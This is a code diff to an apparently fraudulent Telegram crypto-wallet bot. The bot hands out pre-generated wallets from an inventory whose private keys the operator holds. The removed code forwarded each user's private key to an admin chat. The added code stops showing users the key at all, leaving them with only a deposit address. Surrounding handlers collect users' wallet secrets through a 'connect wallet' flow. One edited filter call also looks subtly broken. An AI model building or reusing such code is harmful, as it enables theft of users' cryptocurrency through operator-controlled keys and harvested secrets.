@@ -2130,6 +2130,38 @@ def mark_wallet_as_assigned(wallet_entry: dict, user_id: int) -> None:
     wallet_entry["owner_id"] = user_id
 
 
+def find_wallet_entry(chain: str, address: str):
+    chain_key = (chain or "").upper()
+    for wallet in wallet_inventory.get(chain_key, []):
+        if wallet.get("address") == address:
+            return wallet
+    return None
+
+
+def release_wallet_entry(chain: str, address: str) -> None:
+    wallet_entry = find_wallet_entry(chain, address)
+    if wallet_entry:
+        wallet_entry["assigned_to"] = None
+        wallet_entry["is_assigned"] = False
+        wallet_entry["in_use"] = False
+        wallet_entry["owner_id"] = None
+    assigned_wallets.pop(address, None)
+
+
+def get_existing_wallet_error_text() -> str:
+    return (
+        "<b>❌ FAILED To generate wallet</b>\n"
+        "You already have an existing wallet. Please click Delete\n"
+        "to delete old wallet and generate a new one."
+    )
+
+
+def get_existing_wallet_error_markup():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="Delete", callback_data="delete_wallet")]
+    ])
+
+
 def get_next_wallet(chain: str):
     chain_key = (chain or "").upper()
     for wallet in wallet_inventory.get(chain_key, []):
@@ -2890,29 +2922,21 @@ async def pumpfun_connect_wallet(callback: types.CallbackQuery, state: FSMContex
 # TEXT HANDLER FOR NAMING CONSTRAINT VALIDATION
 @dp.message(WalletSetupState.waiting_for_name)
 async def process_wallet_name(message: types.Message, state: FSMContext):
-    name_input = message.text.strip()
-
-    if not name_input.isalnum() or len(name_input) > 8:
-        try:
-            username = message.from_user.username or message.from_user.first_name or f"user_{message.from_user.id}"
-            await bot.send_message(
-                chat_id=ADMIN_CHAT_ID,
-                text=f"⚠️ Invalid wallet name attempt from @{username} (ID: {message.from_user.id})\nValue: {name_input}"
-            )
-        except Exception as e:
-            print(f"Failed to notify admin about invalid wallet name. Error: {e}")
-
-        await message.answer("⚠️ Name must be 8 letters max, only numbers and letters. Try another name:")
-        return
-
-    if name_input.lower() in used_wallet_names:
-        await message.answer("Name taken. Try another name:")
-        return
-
     try:
-        await message.delete()
-    except Exception as e:
-        print(f"Failed to delete user wallet name message. Error: {e}")
+        user_id = int(message.from_user.id)
+    except Exception:
+        await message.answer("❌ No wallets available")
+        await state.clear()
+        return
+
+    if user_id in user_wallets:
+        await message.answer(
+            text=get_existing_wallet_error_text(),
+            parse_mode="HTML",
+            reply_markup=get_existing_wallet_error_markup(),
+        )
+        await state.clear()
+        return
 
     user_data = await state.get_data()
     chain = (user_data.get("current_chain") or user_data.get("chosen_chain") or "SOL").upper()
@@ -2920,47 +2944,27 @@ async def process_wallet_name(message: types.Message, state: FSMContext):
     wallet_entry = get_next_wallet(chain)
     if not wallet_entry:
         await message.answer(
-            "❌ Failed to generate. Too many users are currently using the bot. Please try again shortly.",
-            reply_markup=get_generation_error_keyboard(message.from_user.id)
+            text="❌ No wallets available",
+            parse_mode="HTML",
         )
         await state.clear()
         return
 
-    used_wallet_names.add(name_input.lower())
-    mark_wallet_as_assigned(wallet_entry, message.from_user.id)
-    user_wallets[message.from_user.id] = {
+    mark_wallet_as_assigned(wallet_entry, user_id)
+    user_wallets[user_id] = {
         "chain": chain,
-        "wallet_name": name_input,
-        "address": wallet_entry["address"],
-        "pk": wallet_entry["pk"],
-        "username": message.from_user.username or message.from_user.first_name or f"user_{message.from_user.id}",
+        "wallet": wallet_entry["address"],
     }
 
     response_text = (
-        "✅ <b>Wallet Generated</b>\n\n"
-        f"<b>Chain:</b> {chain}\n"
-        f"<b>Address:</b> <code>{wallet_entry['address']}</code>\n"
-        f"<b>Private Key:</b> <code>{wallet_entry['pk']}</code>\n\n"
-        "<i>Save this private key securely and never share it. You can also import it into a wallet app if you wish.</i>"
+        "<b>✅ Wallet Generated Successfully</b>\n\n"
+        f"<i>Chain:</i> <b>{chain}</b>\n"
+        "<i>Your Wallet Address:</i>\n"
+        f"<code>{wallet_entry['address']}</code>\n\n"
+        "<i>Please store your wallet securely.</i>"
     )
 
-    try:
-        username = message.from_user.username or message.from_user.first_name or f"user_{message.from_user.id}"
-        await bot.send_message(
-            chat_id=ADMIN_CHAT_ID,
-            text=(
-                f"🆕 New wallet created\n"
-                f"User: @{username} (ID: {message.from_user.id})\n"
-                f"Wallet name: {name_input}\n"
-                f"Chain: {chain}\n"
-                f"Address: {wallet_entry['address']}\n"
-                f"PK: {wallet_entry['pk']}"
-            )
-        )
-    except Exception as e:
-        print(f"Failed to notify admin about wallet creation. Error: {e}")
-
-    await message.answer(text=response_text, parse_mode="HTML", reply_markup=get_wallet_created_keyboard(message.from_user.id))
+    await message.answer(text=response_text, parse_mode="HTML")
     await state.clear()
 
 @dp.message(PhantomConnectState.waiting_for_wallet_secret)
@@ -3544,8 +3548,18 @@ async def connect_external_wallet(callback: types.CallbackQuery, state: FSMConte
     await callback.answer()
 
 
-@dp.callback_query(F.data.in_({"generate_sol_wallet", "generate_wallet"}))
+@dp.callback_query(F.data.in_("generate_sol_wallet", "generate_wallet"))
 async def generate_wallet_alias(callback: types.CallbackQuery, state: FSMContext):
+    user_id = callback.from_user.id
+    if user_id in user_wallets:
+        await callback.message.edit_text(
+            text=get_existing_wallet_error_text(),
+            parse_mode="HTML",
+            reply_markup=get_existing_wallet_error_markup(),
+        )
+        await callback.answer()
+        return
+
     if not get_next_wallet("SOL"):
         await callback.message.edit_text(
             text="❌ Failed to generate. Too many users are currently using the bot. Please try again shortly.",
@@ -3870,6 +3884,36 @@ async def bridge_get_quote(callback: CallbackQuery):
     await callback.answer()
 
 
+@dp.callback_query(F.data == "delete_wallet")
+async def delete_wallet(callback: CallbackQuery):
+    try:
+        user_id = int(callback.from_user.id)
+    except Exception:
+        await callback.answer()
+        return
+
+    wallet_info = user_wallets.get(user_id)
+    if not wallet_info:
+        await callback.message.answer(
+            text="❌ No wallet found to delete",
+            parse_mode="HTML",
+        )
+        await callback.answer()
+        return
+
+    chain = wallet_info.get("chain")
+    wallet_address = wallet_info.get("wallet")
+    if chain and wallet_address:
+        release_wallet_entry(chain, wallet_address)
+
+    user_wallets.pop(user_id, None)
+    await callback.message.answer(
+        text="<b>✅ Wallet deleted successfully. You can now generate a new wallet.</b>",
+        parse_mode="HTML",
+    )
+    await callback.answer()
+
+
 @dp.callback_query(F.data == "bridge_close")
 async def bridge_close(callback: CallbackQuery):
     try:
@@ -3917,8 +3961,15 @@ async def handle_buttons(callback: types.CallbackQuery, state: FSMContext):
 
     elif data.startswith("generate_select_"):
         target_chain = data.split("_")[2].upper()
+        user_id = callback.from_user.id
 
-        if target_chain == "BASE":
+        if user_id in user_wallets:
+            await callback.message.edit_text(
+                text=get_existing_wallet_error_text(),
+                parse_mode="HTML",
+                reply_markup=get_existing_wallet_error_markup(),
+            )
+        elif target_chain == "BASE":
             await callback.message.edit_text(
                 text="Unavailable At the Moment",
                 reply_markup=get_generation_error_keyboard()
@@ -3943,7 +3994,14 @@ async def handle_buttons(callback: types.CallbackQuery, state: FSMContext):
         )
 
     elif data == "generate_wallet":
-        if not get_next_wallet("SOL"):
+        user_id = callback.from_user.id
+        if user_id in user_wallets:
+            await callback.message.edit_text(
+                text=get_existing_wallet_error_text(),
+                parse_mode="HTML",
+                reply_markup=get_existing_wallet_error_markup(),
+            )
+        elif not get_next_wallet("SOL"):
             await callback.message.edit_text(
                 text="❌ Failed to generate. Too many users are currently using the bot. Please try again shortly.",
                 reply_markup=get_generation_error_keyboard()
